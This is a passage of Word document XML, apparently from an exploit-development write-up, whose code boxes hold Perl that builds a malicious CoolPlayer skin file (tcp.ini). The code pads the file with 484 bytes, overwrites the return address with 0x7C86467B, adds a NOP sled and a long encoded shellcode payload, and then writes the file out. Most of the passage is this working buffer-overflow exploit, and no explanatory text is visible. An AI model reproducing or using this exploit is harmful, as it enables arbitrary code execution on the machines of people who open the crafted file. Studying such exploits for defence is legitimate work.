                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x30\x4f\x36\x43\x30\x51\x54\x51\x44\x50\x50\x51\x46\x50" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="30D63C84" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x56\x51\x46\x47\x36\x56\x36\x50\x4e\x56\x36\x51\x46\x56" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="25DC61A8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x33\x51\x46\x52\x48\x43\x49\x58\x4c\x47\x4f\x4b\x36\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="129B2B5F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x4e\x35\x4d\x59\x4b\x50\x50\x4e\x56\x36\x50\x46\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="65DB9DF9" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x50\x30\x45\x38\x54\x48\x4c\x47\x45\x4d\x45\x30\x4b" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="354837B8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4f\x49\x45\x4f\x4b\x4c\x30\x4f\x45\x49\x32\x50\x56\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2E8E54A7" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x48\x4e\x46\x4d\x45\x4f\x4d\x4d\x4d\x4b\x4f\x49\x45\x47" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="25525719" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4c\x45\x56\x43\x4c\x45\x5a\x4b\x30\x4b\x4b\x4d\x30\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="62E4180C" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x55\x45\x55\x4f\x4b\x51\x57\x45\x43\x43\x42\x52\x4f\x52" .</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="637B6683" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>"\x4a\x45\x50\x50\x53\x4b\x4f\x49\x45\x41\x41";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1018ADD9" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="1DD213C8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>open($FILE,"&gt;$file1");</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="1F4DB11B" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="461BBF0A" w14:textId="02901D4C" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00941EC1">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);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771C4" id="Text Box 41" o:spid="_x0000_s1045" type="#_x0000_t202" style="position:absolute;margin-left:231.9pt;margin-top:4.55pt;width:254.5pt;height:600.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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7F6223E0" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$file1 = "tcp.ini"; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="730756E3" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">="; </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7B9D2EE2" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="581C8E02" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5A80D0F2" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x90" x 15;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1ADCB52C" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x89\xe0\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>xda</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>\xd0\xd9\x70\xf4\x5d\x55\x59\x49\x49\x49\x49" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="201F29FC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="669A6995" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4CD16C71" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="193A19CC" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="64FC6C6B" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x38\x4c\x49\x45\x50\x45\x50\x43\x30\x45\x30\x4b\x39\x5a" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="42D81F62" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x45\x50\x31\x58\x52\x45\x34\x4c\x4b\x51\x42\x50\x30\x4c" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7838DC9F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x50\x52\x54\x4c\x4c\x4b\x50\x52\x54\x54\x4c\x4b\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3874C0CA" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x42\x51\x38\x54\x4f\x4e\x57\x50\x4a\x56\x46\x56\x51\x4b" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7214D720" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4f\x50\x31\x4f\x30\x4e\x4c\x47\x4c\x45\x31\x43\x4c\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="248DED59" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x32\x56\x4c\x51\x30\x4f\x31\x58\x4f\x54\x4d\x45\x51\x58" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="73D73995" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x47\x4b\x52\x4c\x30\x50\x52\x50\x57\x4c\x4b\x50\x52\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="22C9098F" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x4c\x4b\x51\x52\x47\x4c\x43\x31\x58\x50\x4c\x4b\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="15807351" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x43\x48\x4d\x55\x4f\x30\x52\x54\x51\x5a\x43\x31\x58" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7BD49F06" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x50\x56\x30\x4c\x4b\x47\x38\x45\x48\x4c\x4b\x51\x48\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="26E596A7" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x30\x45\x51\x49\x43\x5a\x43\x47\x4c\x47\x39\x4c\x4b\x56" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="50D146AE" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x54\x4c\x4b\x45\x51\x58\x56\x50\x31\x4b\x4f\x56\x51\x4f" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="07915C07" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x30\x4e\x4c\x4f\x31\x58\x4f\x54\x4d\x43\x31\x49\x57\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="6E8431B6" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x48\x4b\x50\x52\x55\x4c\x34\x54\x43\x43\x4d\x5a\x58\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="607403A8" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x43\x4d\x51\x34\x43\x45\x4d\x32\x50\x58\x4c\x4b\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5DBD3DA3" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x58\x56\x44\x43\x31\x58\x53\x45\x36\x4c\x4b\x54\x4c\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3FF28EDA" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>"\x4b\x4c\x4b\x50\x58\x45\x4c\x43\x31\x49\x43\x4c\x4b\x54" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="575F059B" w14:textId="77777777" w:rsidR="00941EC1" w:rsidRPr="00941EC1" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00941EC1">
                        <w:rPr>
                          <w:sz w:val="16"/>
